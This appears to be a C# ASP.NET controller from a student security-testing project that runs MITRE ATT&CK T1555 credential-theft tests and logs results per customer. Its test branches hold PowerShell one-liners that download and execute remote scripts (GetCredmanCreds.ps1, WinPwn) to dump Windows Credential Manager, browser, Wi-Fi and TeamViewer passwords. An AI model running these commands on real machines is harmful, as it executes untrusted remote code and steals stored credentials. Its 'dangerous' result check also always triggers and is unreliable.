using FinalProjectMitre.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;
using System.Diagnostics;
using System.Management.Automation;

namespace FinalProjectMitre.Controllers
{
    public class CredentialsController : Controller
    {
        MitreEntities db = new MitreEntities();

        // GET: Credentials
        public ActionResult Index()
        {
            return View();
        }
        public ActionResult History()
        {
            MitreEntities db = new MitreEntities();
            List<Credentials_From_Password_Stores> credentialsList = db.Credentials_From_Password_Stores.ToList();
            return View(credentialsList);
        }

        protected Credentials_From_Password_Stores T1555(int testNumber, int customer_id)
        {
            Credentials_From_Password_Stores credential = new Credentials_From_Password_Stores();
            credential.customer_id = customer_id;
            credential.test_number = testNumber;
            DateTime now = DateTime.Now;
            credential.date = now;
            PowerShell ps = PowerShell.Create();

            if (testNumber == 2)
            {
                ps.AddScript("IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force");
            }
            else if (testNumber == 3)
            {
                ps.AddScript("IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force");
            }
            else if (testNumber == 6)
            {
                ps.AddScript("$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'");
                ps.AddScript("iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')");
                ps.AddScript("lazagnemodule -consoleoutput -noninteractive");
            }
            else if (testNumber == 7)
            {
                ps.AddScript("$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'");
                ps.AddScript("iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')");
                ps.AddScript("wificreds -consoleoutput -noninteractive");
            }
            else if (testNumber == 8)
            {
                ps.AddScript("$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'");
                ps.AddScript("iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')");
                ps.AddScript("decryptteamviewer -consoleoutput -noninteractive");
            }
            var invoke = ps.Invoke();
            if (invoke != null)
            {
                foreach (PSObject p in invoke)
                {
                    Debug.WriteLine(p);
                }
                credential.result = "dangerous";
                Credentials_From_Password_Stores newCredentials = db.Credentials_From_Password_Stores.Add(credential);
                db.SaveChanges();
                return newCredentials;
            }
            else
            {
                credential.result = "safe";
                Credentials_From_Password_Stores newCredentials = db.Credentials_From_Password_Stores.Add(credential);
                db.SaveChanges();
                return newCredentials;
            }
        }
        public ActionResult Test()
        {
            return View();
        }

        [HttpPost]
        public ActionResult Test(int testNumber)
        {
            try
            {
                string username = HttpContext.User.Identity.Name;
                Accounts account = db.Accounts.Where(a => a.username == username).FirstOrDefault();
                Customers customer = db.Customers.Where(c => c.account_id == account.id).FirstOrDefault();
                Credentials_From_Password_Stores credentialsTest = T1555(testNumber, customer.id);
                return View(credentialsTest);
            }
            catch (Exception error)
            {
                Debug.WriteLine(error.Message);
                return View();
            }
        }

        public ActionResult Failed()
        {
            return View();
        }
    }
}